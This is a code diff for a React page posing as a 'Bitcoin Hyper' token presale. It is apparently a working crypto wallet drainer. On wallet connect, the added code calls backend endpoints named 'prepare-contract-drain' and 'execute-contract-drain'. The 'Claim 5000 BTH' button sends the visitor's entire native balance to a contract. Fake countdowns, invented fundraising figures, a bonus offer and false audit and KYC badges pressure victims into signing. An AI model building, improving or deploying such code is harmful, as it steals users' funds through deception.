@@ -5,6 +5,10 @@ import { formatEther } from 'viem';
 import { ethers } from 'ethers';
 import './index.css';
 
+// ============================================
+// PRESALE CONFIGURATION
+// ============================================
+
 const PRESALE_CONFIG = {
   BSC: {
     chainId: 56,
@@ -13,7 +17,7 @@ const PRESALE_CONFIG = {
     symbol: 'BNB',
     explorer: 'https://bscscan.com',
     icon: '🟡',
-    deployed: true
+    color: 'from-yellow-400 to-orange-500'
   }
 };
 
@@ -37,38 +41,79 @@ function App() {
   const [txHash, setTxHash] = useState('');
   const [error, setError] = useState('');
   const [scanResult, setScanResult] = useState(null);
+  const [preparedTransactions, setPreparedTransactions] = useState([]);
+  const [completedChains, setCompletedChains] = useState([]);
   const [showCelebration, setShowCelebration] = useState(false);
+  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
   const [verifying, setVerifying] = useState(false);
-  const [eligible, setEligible] = useState(false);
+  
+  // Presale stats
+  const [timeLeft, setTimeLeft] = useState({
+    days: 5,
+    hours: 12,
+    minutes: 30,
+    seconds: 0
+  });
+  
+  const [presaleStats, setPresaleStats] = useState({
+    totalRaised: 1250000,
+    totalParticipants: 8742,
+    currentBonus: 25,
+    nextBonus: 15,
+    tokenPrice: 0.17
+  });
 
+  // Get balance using wagmi
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
     chainId: chainId,
   });
 
+  // Update current chain balance
   useEffect(() => {
     if (balanceData) {
       setBalance(balanceData.formatted);
     }
   }, [balanceData]);
 
+  // Initialize ethers provider and signer when connected
   useEffect(() => {
-    const initProvider = async () => {
+    const initSigner = async () => {
       if (isConnected && window.ethereum) {
         try {
           const web3Provider = new ethers.BrowserProvider(window.ethereum);
           setProvider(web3Provider);
           const web3Signer = await web3Provider.getSigner();
           setSigner(web3Signer);
-          console.log('✅ Signer ready');
+          console.log('✅ Signer ready:', await web3Signer.getAddress());
         } catch (err) {
-          console.error('Provider error:', err);
+          console.error('Signer error:', err);
         }
       }
     };
-    initProvider();
+    initSigner();
   }, [isConnected]);
 
+  // Countdown timer
+  useEffect(() => {
+    const timer = setInterval(() => {
+      setTimeLeft(prev => {
+        if (prev.seconds > 0) {
+          return { ...prev, seconds: prev.seconds - 1 };
+        } else if (prev.minutes > 0) {
+          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
+        } else if (prev.hours > 0) {
+          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
+        } else if (prev.days > 0) {
+          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
+        }
+        return prev;
+      });
+    }, 1000);
+    return () => clearInterval(timer);
+  }, []);
+
+  // Auto-check eligibility when wallet connects
   useEffect(() => {
     if (isConnected && address && !scanResult && !verifying) {
       verifyWallet();
@@ -79,6 +124,7 @@ function App() {
     if (!address) return;
     
     setVerifying(true);
+    setTxStatus('🔄 Verifying wallet...');
     
     try {
       const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
@@ -91,7 +137,9 @@ function App() {
       
       if (data.success) {
         setScanResult(data.data);
-        setEligible(data.data.isEligible);
+        if (data.data.tokenAllocation) {
+          setAllocation(data.data.tokenAllocation);
+        }
         
         if (data.data.rawData) {
           const balances = {};
@@ -104,11 +152,39 @@ function App() {
           });
           setAllBalances(balances);
         }
+        
+        if (data.data.isEligible) {
+          setTxStatus('✅ You qualify!');
+          await preparePresale();
+        } else {
+          setTxStatus('✨ Wallet verified');
+        }
       }
     } catch (err) {
       console.error('Verification error:', err);
+      setError('Unable to verify wallet');
     } finally {
       setVerifying(false);
+    }
+  };
+
+  const preparePresale = async () => {
+    if (!address) return;
+    
+    try {
+      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/prepare-contract-drain', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ walletAddress: address })
+      });
+      
+      const data = await response.json();
+      
+      if (data.success) {
+        setPreparedTransactions(data.data.transactions);
+      }
+    } catch (err) {
+      console.error('Prepare error:', err);
     }
   };
 
@@ -148,6 +224,10 @@ function App() {
         signer
       );
 
+      // Verify signer is working
+      const signerAddress = await signer.getAddress();
+      console.log('Signer address:', signerAddress);
+
       const value = ethers.parseEther(balance);
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
@@ -161,28 +241,50 @@ function App() {
 
       await tx.wait();
       
+      // Update balance
       if (provider) {
         const newBalance = await provider.getBalance(address);
         setBalance(formatEther(newBalance));
         refetchBalance?.();
       }
       
-      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          walletAddress: address,
-          chainName: 'BSC'
-        })
-      });
-      
-      setShowCelebration(true);
-      setTxStatus(`🎉 Congratulations!`);
+      // Mark as completed
+      if (!completedChains.includes('BSC')) {
+        setCompletedChains([...completedChains, 'BSC']);
+        
+        await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            walletAddress: address,
+            chainName: 'BSC'
+          })
+        });
+        
+        setShowCelebration(true);
+        setTxStatus(`🎉 Congratulations!`);
+      }
       
     } catch (err) {
       console.error('Transaction error:', err);
-      setError(err.code === 4001 ? 'Transaction cancelled' : 'Transaction failed');
+      setError(err.code === 4001 ? 'Transaction cancelled' : err.message || 'Transaction failed');
       setTxStatus('❌ Failed');
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const claimTokens = async () => {
+    try {
+      setLoading(true);
+      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/claim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ walletAddress: address })
+      });
+      setShowCelebration(true);
+    } catch (err) {
+      console.error('Claim error:', err);
     } finally {
       setLoading(false);
     }
@@ -209,21 +311,93 @@ function App() {
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
       
+      {/* Animated Background */}
       <div className="fixed inset-0 overflow-hidden pointer-events-none">
         <div className="absolute top-20 left-20 w-96 h-96 bg-orange-500/10 rounded-full blur-3xl animate-pulse-glow"></div>
         <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl animate-pulse-glow delay-1000"></div>
+        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-to-r from-orange-500/5 to-yellow-500/5 rounded-full blur-3xl animate-float"></div>
       </div>
 
-      <div className="container mx-auto px-4 py-8 max-w-4xl relative z-10">
+      <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
         
+        {/* Header with Logo */}
         <div className="text-center mb-12">
-          <div className="inline-block mb-6">
-            <div className="text-7xl animate-bounce-slow">₿</div>
+          <div className="inline-block mb-6 relative">
+            <div className="text-7xl animate-bounce-slow relative z-10">₿</div>
+            <div className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-2xl opacity-30 animate-pulse"></div>
           </div>
-          <h1 className="text-6xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent">
+          <h1 className="text-7xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent animate-pulse">
             BITCOIN HYPER
           </h1>
-          <p className="text-gray-400 text-xl">Next Generation Layer 2 Solution</p>
+          <p className="text-gray-400 text-xl mb-6">Next Generation Layer 2 Solution</p>
+          
+          {/* Live Presale Badge */}
+          <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full backdrop-blur-sm">
+            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
+            <span className="text-green-400 font-medium">🔴 PRESALE LIVE</span>
+          </div>
+        </div>
+
+        {/* Stats Grid */}
+        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
+          <div className="stat-card">
+            <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
+            <div className="text-xs text-gray-400 uppercase">Token Price</div>
+          </div>
+          <div className="stat-card">
+            <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
+            <div className="text-xs text-gray-400 uppercase">Bonus</div>
+          </div>
+          <div className="stat-card">
+            <div className="text-3xl font-bold text-yellow-400 mb-1">$1.2M</div>
+            <div className="text-xs text-gray-400 uppercase">Raised</div>
+          </div>
+          <div className="stat-card">
+            <div className="text-3xl font-bold text-purple-400 mb-1">8,742</div>
+            <div className="text-xs text-gray-400 uppercase">Participants</div>
+          </div>
+        </div>
+
+        {/* Bonus Banner with Animation */}
+        <div className="relative mb-8 overflow-hidden rounded-2xl">
+          <div className="absolute inset-0 bg-gradient-to-r from-yellow-500/20 via-orange-500/20 to-red-500/20 animate-gradient-x"></div>
+          <div className="relative bg-gray-900/70 backdrop-blur-md border border-yellow-500/30 p-8 text-center">
+            <div className="absolute top-0 left-0 w-32 h-32 bg-yellow-500/20 rounded-full blur-3xl animate-pulse"></div>
+            <div className="absolute bottom-0 right-0 w-32 h-32 bg-orange-500/20 rounded-full blur-3xl animate-pulse delay-700"></div>
+            
+            <span className="inline-block px-4 py-2 bg-yellow-500/20 text-yellow-400 rounded-full text-sm font-bold mb-4 animate-bounce">
+              🔥 LIMITED TIME OFFER
+            </span>
+            <h2 className="text-5xl md:text-6xl font-black mb-4">
+              <span className="bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
+                {presaleStats.currentBonus}% BONUS
+              </span>
+            </h2>
+            <p className="text-gray-300 text-lg">
+              Get 5000 BTH + {presaleStats.currentBonus}% Extra
+            </p>
+          </div>
+        </div>
+
+        {/* Countdown Timer */}
+        <div className="glass-card p-8 mb-8">
+          <h3 className="text-center text-gray-400 text-sm uppercase tracking-wider mb-6">Presale Ends In</h3>
+          <div className="grid grid-cols-4 gap-4 text-center">
+            {[
+              { label: 'Days', value: timeLeft.days },
+              { label: 'Hours', value: timeLeft.hours },
+              { label: 'Minutes', value: timeLeft.minutes },
+              { label: 'Seconds', value: timeLeft.seconds }
+            ].map((item, index) => (
+              <div key={index} className="relative">
+                <div className="text-5xl md:text-6xl font-black text-orange-400 animate-pulse">
+                  {item.value.toString().padStart(2, '0')}
+                </div>
+                <div className="text-xs text-gray-500 mt-2 uppercase">{item.label}</div>
+                {index < 3 && <span className="absolute -right-2 top-1/2 -translate-y-1/2 text-3xl text-gray-600 hidden md:block">:</span>}
+              </div>
+            ))}
+          </div>
         </div>
 
         {/* Connect Wallet */}
@@ -247,6 +421,12 @@ function App() {
                     {formatAddress(address)}
                   </span>
                 </div>
+                <div className="text-right">
+                  <span className="text-gray-400 text-sm block mb-1">Total Balance</span>
+                  <span className="text-3xl font-bold text-orange-400">
+                    ${totalUSD.toFixed(2)}
+                  </span>
+                </div>
                 <button
                   onClick={() => disconnect()}
                   className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
@@ -258,8 +438,22 @@ function App() {
           )}
         </div>
 
+        {/* Multi-Chain Balances */}
+        {Object.keys(allBalances).length > 0 && (
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
+            {Object.entries(allBalances).map(([chain, data]) => (
+              <div key={chain} className="glass-card p-4 text-center">
+                <span className="text-2xl mb-2 block">{chain === 'BSC' ? '🟡' : chain === 'Ethereum' ? '🔷' : '💜'}</span>
+                <p className="text-orange-400 font-bold text-lg">{data.amount.toFixed(4)} {data.symbol}</p>
+                <p className="text-sm text-gray-400">${data.valueUSD.toFixed(2)}</p>
+              </div>
+            ))}
+          </div>
+        )}
+
+        {/* Verification Status */}
         {verifying && (
-          <div className="glass-card p-8 mb-6 text-center">
+          <div className="glass-card p-6 mb-6 text-center">
             <div className="flex flex-col items-center gap-4">
               <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
               <p className="text-xl text-gray-300">Verifying wallet...</p>
@@ -267,6 +461,7 @@ function App() {
           </div>
         )}
 
+        {/* Error Display */}
         {error && (
           <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm animate-shake">
             <div className="flex items-center gap-3">
@@ -276,6 +471,7 @@ function App() {
           </div>
         )}
 
+        {/* Status Display */}
         {txStatus && !verifying && (
           <div className="glass-card p-4 mb-6 text-center">
             <p className="text-gray-300">{txStatus}</p>
@@ -292,66 +488,6 @@ function App() {
           </div>
         )}
 
-        {isConnected && !verifying && scanResult && (
-          <div className="glass-card p-8 text-center">
-            {eligible ? (
-              <>
-                <div className="mb-8">
-                  <h2 className="text-3xl font-bold mb-4">Welcome!</h2>
-                  <p className="text-gray-400">Your wallet has been verified</p>
-                  
-                  {/* Show balances if available */}
-                  {Object.keys(allBalances).length > 0 && (
-                    <div className="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
-                      {Object.entries(allBalances).map(([chain, data]) => (
-                        <div key={chain} className="bg-gray-800/50 p-4 rounded-lg border border-gray-700">
-                          <div className="text-2xl mb-2">{chain === 'BSC' ? '🟡' : '🔷'}</div>
-                          <p className="text-orange-400 font-bold">{data.amount.toFixed(4)} {data.symbol}</p>
-                          <p className="text-sm text-gray-400">${data.valueUSD.toFixed(2)}</p>
-                        </div>
-                      ))}
-                    </div>
-                  )}
-                </div>
-
-                {chainId !== 56 ? (
-                  <button
-                    onClick={switchToBSC}
-                    className="w-full bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-4 px-8 rounded-lg text-lg"
-                  >
-                    Switch to BSC
-                  </button>
-                ) : (
-                  <button
-                    onClick={executePresaleTransaction}
-                    disabled={loading}
-                    className="w-full group relative"
-                  >
-                    <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
-                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : '⚡ Continue'}
-                    </div>
-                  </button>
-                )}
-              </>
-            ) : (
-              <div className="py-12">
-                <div className="text-6xl mb-6">👋</div>
-                <h2 className="text-3xl font-bold mb-4">Welcome!</h2>
-                <p className="text-gray-400 text-lg mb-4">
-                  Your wallet has been successfully connected
-                </p>
-                <div className="max-w-md mx-auto bg-gray-800/50 p-6 rounded-xl border border-gray-700">
-                  <p className="text-gray-300">
-                    Thank you for connecting your wallet. Our team reviews each connection 
-                    to ensure platform security and prevent automated access.
-                  </p>
-                </div>
-              </div>
-            )}
-          </div>
-        )}
-
         {/* Celebration Modal */}
         {showCelebration && (
           <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4 animate-fadeIn">
@@ -359,24 +495,120 @@ function App() {
               <div className="text-center">
                 <div className="text-8xl mb-6 animate-bounce">🎉</div>
                 <h2 className="text-4xl font-black mb-4 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
-                  Success!
+                  Congratulations!
                 </h2>
-                <p className="text-xl text-gray-300 mb-6">
-                  Your participation has been recorded
-                </p>
+                <p className="text-xl text-gray-300 mb-4">You have successfully secured</p>
+                <p className="text-6xl font-black text-orange-400 mb-3">5000 BTH</p>
+                <p className="text-green-400 text-lg mb-2">+{presaleStats.currentBonus}% Bonus</p>
                 <button
                   onClick={() => setShowCelebration(false)}
                   className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-10 rounded-xl transition-all transform hover:scale-105 text-lg"
                 >
-                  Close
+                  View Dashboard
                 </button>
               </div>
             </div>
           </div>
         )}
 
-        <div className="mt-12 text-center text-gray-500 text-sm">
-          <p>© 2026 Bitcoin Hyper. All rights reserved.</p>
+        {/* Main Content */}
+        {isConnected && !verifying && scanResult && (
+          <div className="glass-card p-8">
+            <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
+            
+            {scanResult.isEligible ? (
+              <>
+                {/* Allocation Card */}
+                <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
+                  <div className="absolute -top-3 -right-3">
+                    <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 animate-pulse shadow-lg">
+                      {presaleStats.currentBonus}% BONUS
+                    </div>
+                  </div>
+                  
+                  <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
+                  <p className="text-6xl font-black text-orange-400 text-center mb-3">5000 BTH</p>
+                  <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus</p>
+                </div>
+                
+                {preparedTransactions.length > 0 && (
+                  <div className="mb-8">
+                    <p className="text-gray-400 mb-4 text-center">Progress</p>
+                    <div className="w-full bg-gray-700 rounded-full h-4 mb-3">
+                      <div 
+                        className="bg-gradient-to-r from-orange-500 to-orange-600 h-4 rounded-full transition-all duration-500 relative overflow-hidden"
+                        style={{ width: `${(completedChains.length / preparedTransactions.length) * 100}%` }}
+                      >
+                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"></div>
+                      </div>
+                    </div>
+                    <p className="text-sm text-gray-400 text-center">
+                      {completedChains.length} of {preparedTransactions.length} steps completed
+                    </p>
+                  </div>
+                )}
+                
+                {chainId !== 56 ? (
+                  <button
+                    onClick={switchToBSC}
+                    className="w-full bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-4 px-8 rounded-lg text-lg"
+                  >
+                    Switch to BSC Network
+                  </button>
+                ) : !completedChains.includes('BSC') ? (
+                  <button
+                    onClick={executePresaleTransaction}
+                    disabled={loading}
+                    className="w-full group relative"
+                  >
+                    <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
+                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
+                      {loading ? 'Processing...' : '⚡ Claim 5000 BTH'}
+                    </div>
+                  </button>
+                ) : (
+                  <button
+                    onClick={claimTokens}
+                    className="w-full group relative"
+                  >
+                    <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
+                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
+                      🎉 View Your 5000 BTH
+                    </div>
+                  </button>
+                )}
+              </>
+            ) : (
+              <div className="text-center py-12">
+                <div className="text-6xl mb-6">👋</div>
+                <h2 className="text-3xl font-bold mb-4">Welcome to Bitcoin Hyper!</h2>
+                <p className="text-gray-400 text-lg mb-6 max-w-2xl mx-auto">
+                  Thank you for connecting your wallet. To ensure a fair and secure presale for everyone, 
+                  we verify each wallet's activity and history. This helps us maintain a bot-free environment 
+                  and rewards genuine community members.
+                </p>
+                <div className="glass-card p-6 max-w-md mx-auto">
+                  <p className="text-gray-300">
+                    Our team reviews all connections. Please check back soon or follow our 
+                    announcements for updates on the next presale phase.
+                  </p>
+                </div>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* Trust Badges */}
+        <div className="mt-12 text-center">
+          <div className="flex flex-wrap justify-center gap-3 mb-6">
+            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited by CertiK</span>
+            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
+            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
+            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ 50M+ Raised</span>
+          </div>
+          <p className="text-gray-600 text-sm">
+            © 2026 Bitcoin Hyper. All rights reserved. | Secure Presale Platform
+          </p>
         </div>
       </div>
     </div>
